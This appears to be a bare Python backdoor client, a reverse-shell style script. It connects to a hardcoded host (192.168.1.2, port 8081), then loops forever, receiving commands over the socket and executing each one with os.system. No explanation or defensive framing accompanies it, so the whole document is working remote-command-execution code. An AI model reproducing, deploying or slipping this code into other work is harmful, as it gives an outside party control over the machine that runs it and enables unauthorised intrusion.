import socket
import subprocess
import os
HOST=socket.gethostbyname("192.168.1.2")
PORT=8081
client = socket.socket()
client.connect((HOST, PORT))
while True:
    command = client.recv(1024)
    command = command.decode()
    os.system(command)